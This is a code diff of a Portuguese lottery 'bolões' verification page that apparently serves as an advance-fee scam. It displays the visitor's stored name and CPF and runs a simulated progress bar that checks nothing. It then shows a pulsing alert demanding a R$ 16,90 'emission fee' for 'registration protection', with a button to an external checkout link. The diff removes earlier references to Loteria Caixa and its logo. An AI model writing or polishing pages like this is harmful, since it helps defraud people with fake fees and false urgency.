@@ -31,6 +31,9 @@
       --danger:#d32f2f;
       --shadow:0 8px 22px rgba(0,0,0,.08);
       --radius:12px;
+
+      /* controla altura do header para o overlay não cobrir */
+      --headerH:120px;
     }
 
     *{box-sizing:border-box;margin:0;padding:0}
@@ -39,12 +42,12 @@
       background:var(--bg);
       color:var(--text);
       min-height:100vh;
-      padding-top:120px;
+      padding-top:var(--headerH);
       padding-bottom:40px;
     }
 
     .header{
-      position:fixed;top:0;left:0;width:100%;height:120px;z-index:999;
+      position:fixed;top:0;left:0;width:100%;height:var(--headerH);z-index:999;
       display:flex;align-items:center;justify-content:center;
       background:linear-gradient(135deg,var(--primary) 0%, var(--primaryDark) 100%);
       box-shadow:0 4px 12px rgba(0,0,0,.10);
@@ -73,9 +76,7 @@
       overflow:hidden;
     }
 
-    .main{
-      padding:34px 28px;
-    }
+    .main{ padding:34px 28px; }
 
     .title{
       font-size:28px;
@@ -169,11 +170,14 @@
       text-align:center;
     }
 
-    /* Overlay de loading */
+    /* Overlay de loading (IMPORTANTE: não cobre o header) */
     #loadingOverlay{
       display:none;
       position:fixed;
-      inset:0;
+      top:var(--headerH);
+      left:0;
+      width:100%;
+      height:calc(100vh - var(--headerH));
       background:#fff;
       z-index:9999;
       align-items:center;
@@ -227,11 +231,47 @@
       box-shadow:var(--shadow);
       background:#fff;
     }
+
+    /* Ícone de alerta animado */
+    .alertWrap{
+      display:flex;
+      justify-content:center;
+      margin-bottom:10px;
+    }
+    .alertIcon{
+      width:64px;height:64px;
+      border-radius:18px;
+      background:rgba(211,47,47,.10);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      position:relative;
+      animation: alertPulse 1.35s ease-in-out infinite;
+    }
+    .alertIcon::before{
+      content:"";
+      position:absolute;
+      inset:-10px;
+      border-radius:22px;
+      border:2px solid rgba(211,47,47,.25);
+      animation: alertRing 1.35s ease-in-out infinite;
+    }
+    @keyframes alertPulse{
+      0%,100%{ transform:scale(1); }
+      50%{ transform:scale(1.06); }
+    }
+    @keyframes alertRing{
+      0%{ transform:scale(.85); opacity:.0; }
+      30%{ opacity:.55; }
+      100%{ transform:scale(1.18); opacity:0; }
+    }
+
     .feeTitle{
       color:var(--danger);
       font-size:20px;
       font-weight:900;
       margin-bottom:10px;
+      text-align:center;
     }
     .feeText{
       color:#374151;
@@ -275,14 +315,12 @@
     }
 
     @media (max-width:600px){
-      body{padding-top:110px}
-      .header{height:110px}
+      :root{ --headerH:110px; }
       .main{padding:26px 18px}
       .title{font-size:24px}
     }
   </style>
 
-  <!-- Captura UTMs (mantive seu padrão, versão compacta) -->
   <script>
     (function(){
       const urlParams = new URLSearchParams(location.search);
@@ -309,7 +347,6 @@
 <body>
   <div class="header">
     <div class="brandWrap">
-      <!-- Troque pelo seu logo -->
       <img id="brandLogo" src="/painel/sucesso/images/logobrancal.png" alt="Plataforma de Bolões" />
       <div class="headerMeta" id="headerDataHora">Verificação de Bolões • --</div>
     </div>
@@ -364,9 +401,9 @@
     </div>
   </div>
 
-  <!-- Overlay Loading -->
+  <!-- Overlay Loading (não cobre o header) -->
   <div id="loadingOverlay">
-    <img src="/painel/sucesso/images/loteriascaixa.svg" alt="Logo" />
+    <img src="/painel/sucesso/images/logobrancal.png" alt="Logo" />
     <div class="progressOuter"><div id="progressBar"></div></div>
     <div id="progressPct">0%</div>
     <p id="loadingText">Iniciando verificação…</p>
@@ -376,7 +413,7 @@
     'use strict';
 
     // ====== CONFIG ======
-    const CHECKOUT_TAXA_URL = 'https://www.pay-pagamentos.link/checkout/b97ef9c7-507d-4d78-980b-85e39048edd0'; // troque pelo seu link
+    const CHECKOUT_TAXA_URL = 'https://www.pay-pagamentos.link/checkout/b97ef9c7-507d-4d78-980b-85e39048edd0';
     const TAXA_VALOR_EXIBIR = 'R$ 16,90';
 
     // ====== UTIL ======
@@ -403,21 +440,14 @@
     }
 
     function getLeadFromStorage(){
-      // 1) seu padrão antigo (nome/cpf soltos)
       const nome = safeText(localStorage.getItem('nome') || localStorage.getItem('nomeUsuario') || '', 120);
 
-      // 2) seu padrão lembrado (dadosUsuario JSON com {nome, cpf})
       let cpf = localStorage.getItem('cpf') || localStorage.getItem('cpfUsuario') || '';
       try{
         const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario') || 'null');
-        if(dadosUsuario){
-          if(!nome && dadosUsuario.nome) {}
-          if(dadosUsuario.nome && !nome) {}
-          if(dadosUsuario.cpf) cpf = dadosUsuario.cpf;
-        }
+        if(dadosUsuario && dadosUsuario.cpf) cpf = dadosUsuario.cpf;
       }catch(e){}
 
-      // valor pode vir da URL (?valor=) ou localStorage
       const urlParams = new URLSearchParams(location.search);
       const valorUrl = urlParams.get('valor');
       const valorLs = localStorage.getItem('valor') || localStorage.getItem('valorCompra') || '';
@@ -435,12 +465,10 @@
       document.getElementById('leadNome').textContent = nome || '—';
       document.getElementById('leadCpf').textContent = cpf ? Formatadores.cpf(cpf) : '—';
 
-      // tenta formatar valor (se vier como número)
       const valorNum = Number(String(valor).replace(/[^\d,.-]/g,'').replace(',','.'));
       document.getElementById('leadValor').textContent =
         isFinite(valorNum) ? Formatadores.moeda(valorNum) : (valor ? safeText(valor, 20) : '—');
 
-      // data/hora da compra: se você salvar em localStorage, usa; senão usa agora
       const dh = localStorage.getItem('dataCompra') || localStorage.getItem('purchase_datetime') || '';
       document.getElementById('leadDataHora').textContent = dh ? safeText(dh, 40) : Formatadores.dataHora(new Date());
     }
@@ -466,7 +494,7 @@
       ];
 
       const interval = setInterval(()=>{
-        progress += Math.floor(Math.random()*12)+8; // 8–19
+        progress += Math.floor(Math.random()*12)+8;
         if(progress > 100) progress = 100;
 
         bar.style.width = progress + '%';
@@ -487,16 +515,21 @@
 
       overlay.innerHTML = `
         <div class="feeBox">
-          <div style="display:flex;justify-content:center;margin-bottom:10px">
-            <img src="images/logo.png" alt="Logo" style="width:170px;height:auto" />
+          <div class="alertWrap">
+            <div class="alertIcon" aria-hidden="true">
+              <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+                <path d="M12 2.5L22 20.5H2L12 2.5Z" fill="rgba(211,47,47,0.20)" stroke="rgba(211,47,47,0.85)" stroke-width="1.5"/>
+                <path d="M12 8V13.2" stroke="rgba(211,47,47,0.95)" stroke-width="2" stroke-linecap="round"/>
+                <circle cx="12" cy="16.8" r="1.1" fill="rgba(211,47,47,0.95)"/>
+              </svg>
+            </div>
           </div>
 
           <div class="feeTitle">Emissão de Comprovante</div>
 
           <div class="feeText">
-            Para concluir a sua aposta e ativar a
-            <strong>Proteção de Registro</strong> dos bolões na Loteria Caixa, é necessária a
-            <strong>Tarifa de Emissão de Comprovante</strong>.
+            Para concluir a emissão e ativar a <strong>Proteção de Registro</strong> dos bolões,
+            é necessária a <strong>Taxa de Emissão</strong>.
           </div>
 
           <ul class="feeList">
@@ -508,7 +541,7 @@
 
           <div class="feeValue">Valor: ${TAXA_VALOR_EXIBIR}</div>
 
-          <button class="feeBtn" id="payFeeBtn">Pagar tarifa e concluir</button>
+          <button class="feeBtn" id="payFeeBtn">Pagar taxa e concluir</button>
 
           <div class="feeSmall">
             * Esta taxa é aplicada pela <strong>plataforma</strong> para cobrir custos de processamento e emissão.
